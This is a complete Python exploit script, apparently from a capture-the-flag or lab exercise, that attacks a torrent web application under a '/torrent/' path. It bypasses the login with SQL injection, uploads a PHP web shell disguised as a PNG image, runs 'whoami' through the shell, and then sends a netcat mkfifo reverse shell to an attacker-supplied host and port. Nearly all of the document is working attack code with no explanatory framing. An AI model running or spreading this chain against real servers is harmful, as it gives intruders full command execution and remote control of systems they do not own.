import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login_admin(url, s):
    login_url = url + '/torrent/login.php'
    data = {"username": "admin' or '1'='", "password":"doesntmatter"}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    login_users = url +'/torrent/users/'
    if r.status_code == 200:
        print("[+] Login Succesful")
    else: 
        print("[-] Login Failed :-(")




def upload_file(url,s):
    #uploading the file
    upload_url = url + '/torrent/upload_file.php?mode=upload&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4'
    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------23694939913165270677917025388"}
    data = """-----------------------------23694939913165270677917025388
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>

-----------------------------23694939913165270677917025388
Content-Disposition: form-data; name="submit"

Submit Screenshot
-----------------------------23694939913165270677917025388--

    """
    r = s.post(upload_url, headers=headers, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Upload Completed" in res:
        print("[+] The file was uploaded successfully! ")
    else:
        print("[-] The file was not uploaded... ")
        sys.exit()
        
def checking_execution(url, s):
    upload_url = url + '/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=whoami'
    r = s.get(upload_url, proxies=proxies, verify=False)
    res = r.text
    print("[+] The Output of the command execution... =   " + res)
    print("[+] Don't forget to start a nc listener.....")
    print("[+] Now trying to get a shell.....")


def poppin_shell(url, LHOST, LPORT):
    command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f' % (LHOST, LPORT)
    command_url = url + '/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd='
    escaped_command = urllib.parse.quote(command)
    full_exploit = command_url + escaped_command

    r = requests.get(full_exploit, proxies=proxies, verify=False)
    res = r.text
    if r.status_code == 200:
        print("[+] Output of the command: ")
        print(res)


def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <LHOST> <LPORT>" % sys.argv[0])
        print('(+) eg: %s http://example.com 10.10.14.23 8000' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    s = requests.Session()
    login_admin(url, s)
    upload_file(url, s)
    checking_execution(url, s)
    poppin_shell(url, LHOST, LPORT)
    
    
if __name__ == "__main__":
    main()